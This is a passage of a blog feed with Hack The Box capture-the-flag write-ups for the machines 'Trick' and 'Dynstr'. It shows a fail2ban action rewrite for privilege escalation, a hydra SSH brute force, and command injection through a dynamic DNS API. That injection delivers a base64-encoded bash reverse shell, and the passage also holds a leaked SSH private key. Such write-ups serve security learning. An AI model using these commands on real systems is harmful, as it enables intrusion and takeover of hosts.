+&lt;p&gt;The folder &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;action.d&lt;/code&gt; has a group of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;groups
+&lt;/span&gt;michael security
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we’re also part of that same group. The &lt;a href=&quot;https://www.fail2ban.org/wiki/index.php/MANUAL_0_8#Actions&quot;&gt;Actions&lt;/a&gt; directory is used to contain commands that are executed when someone is sent to jail. And even more specifically, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iptables-multiport.conf&lt;/code&gt; contains rules which are executed on a ban. And we can rename files in this directory. So while we can’t directly modify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iptables-multiport.conf&lt;/code&gt; file, we can rename it and create a new file. Unfortunately it appears as though this directory is restored back to the original state very quickly, so I had to try this a few times before it eventually worked. I created a script to update the .conf file:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;reset_conf.sh 
+&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /etc/fail2ban/action.d/iptables-multiport.conf&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;,.backup&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/fail2ban/action.d/iptables-multiport.conf.backup | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s:^actionban.*$:actionban = cat /root/root.txt &amp;gt; /tmp/root.txt \&amp;amp;\&amp;amp; chmod 777 /tmp/root.txt:g&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/fail2ban/action.d/iptables-multiport.conf
+&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /etc/init.d/fail2ban restart
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then I started a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hydra&lt;/code&gt; session to brute force the login and force a ban:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; /usr/share/wordlists/rockyou.txt trick.htb &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 4 ssh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After a while of trying this and restarting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; service with the above script, eventually the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/root.txt&lt;/code&gt; file appeared:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-larth&lt;/span&gt; /tmp/root.txt 
+&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt; 1 root root 33 Jun 24 19:42 /tmp/root.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note that, instead of performing a cp operation, it would have been possible to start a reverse shell too, or chmod another file that can give you root.&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb easy" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Trick. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">HTB: Dynstr Writeup</title><link href="/blog/writeup/htb/htb-dynstr/" rel="alternate" type="text/html" title="HTB: Dynstr Writeup" /><published>2021-06-17T23:36:00-07:00</published><updated>2021-06-17T23:36:00-07:00</updated><id>/blog/writeup/htb/htb-dynstr</id><content type="html" xml:base="/blog/writeup/htb/htb-dynstr/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;This is by FAR the most difficult box that I’ve done on HTB (I haven’t done any hard or insane boxes, but this was harder than any other medium box I’ve done).&lt;/p&gt;
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/dynstr 10.129.124.191
+Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-06-12 15:12 EDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.124.191
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.091s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+53/tcp open  domain  ISC BIND 9.16.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;17.07 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There are a couple things of interest, port 53 (typically DNS stuff) and port 80 hosting an Apache server. I’ll check out port 80 first.&lt;/p&gt;
+
+&lt;h2 id=&quot;port-80&quot;&gt;Port 80&lt;/h2&gt;
+&lt;p&gt;There appears to be a single webpage with nothing else of interest from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nikto&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt;. The website lists the following information&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Domains:
+    dnsalias.htb
+    dynamicdns.htb
+    no-ip.htb
+
+Login:
+    Username: dynadns
+    Password: sndanyd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The website also says that it uses the same API as no-ip.com and through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; I located &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nic/update&lt;/code&gt;. Giving that a try, I found that we can update dynamic DNS entries with a curl command like the following&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;dynadns:sndanyd&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://no-ip.htb/nic/update?hostname=test.no-ip.htb&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And this is where I was stuck for the LONGEST time! I tried many combinations, locating the longest length of string I could send, trying different credentials, etc. I even tried many MANY fuzzing strings as input, but had little to no progress. The only thing I really noticed was that it seemed to ignore quotes (“) when executing.&lt;/p&gt;
+
+&lt;p&gt;After a LONG time and a lot of googling, I learned that it’s actually executing what is being sent in as a command. For example, this successfully executes:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;dynadns:sndanyd&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://no-ip.htb/nic/update?hostname=$(echo+&quot;test&quot;).no-ip.htb&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Using this RCE, we can send ourselves a reverse shell, but because we’re dealing with a URL, we need to avoid special characters, so we can do that by base64 encoding the payload (note if the base64 string contains a + character, you can double-base64 encode it or adjust spacing to avoid it).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;bash -i &amp;amp;&amp;gt;/dev/tcp/10.10.14.5/9000 &amp;lt;&amp;amp;1&apos;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjUvOTAwMCA8JjE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;dynadns:sndanyd&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://no-ip.htb/nic/update?hostname=$(echo+&quot;YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjUvOTAwMCA8JjE=&quot;|base64+-d|bash).no-ip.htb&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And catching this with a netcat listener&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 9000
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 9000 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.5] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.244] 53788
+bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;753&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+www-data@dynstr:/var/www/html/nic&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Success! We have a remote shell!&lt;/p&gt;
+
+&lt;h1 id=&quot;privesc---user&quot;&gt;Privesc - User&lt;/h1&gt;
+&lt;p&gt;Now that we’re running as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; user, we need to move to the regular user.&lt;/p&gt;
+
+&lt;p&gt;Firstly, the files &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/bindmgr/.ssh/id_rsa.pub&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/bindmgr/.ssh/authorized_keys&lt;/code&gt; are readable and contain the same entry, so if we can locate the value in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/bindmgr/.ssh/id_rsa&lt;/code&gt; we should be able to login! Unfortunately, there are a few issues with this.&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; file is not readable&lt;/li&gt;
+  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; lists that it will only accept connections from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*.infra.dyna.htb&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;For the first problem, searching a little bit reveals the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/bindmgr/support-case-C62796521/strace-C62796521.txt&lt;/code&gt; which contains an strace of some command being executed, but within the strace output we see an OpenSSH private key!&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;15123 read(5, &quot;-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n&quot;, 4096) = 1823
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Back on our machine, we can store this for later use&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;-----BEGIN OPENSSH PRIVATE KEY-----&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-----END OPENSSH PRIVATE KEY-----&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; bindmgr
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;700 bindmgr
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now for the second problem of the hostname. We know that this server acts as a dynamic DNS server, so it updates hostnames all the time, but it only allows updating of specific addresses, so lets check to see why this is?&lt;/p&gt;
+
+&lt;p&gt;Taking a look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/nic/update&lt;/code&gt; file, we see that it’s a PHP file:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// Check authentication&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;PHP_AUTH_USER&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;PHP_AUTH_PW&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;badauth&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
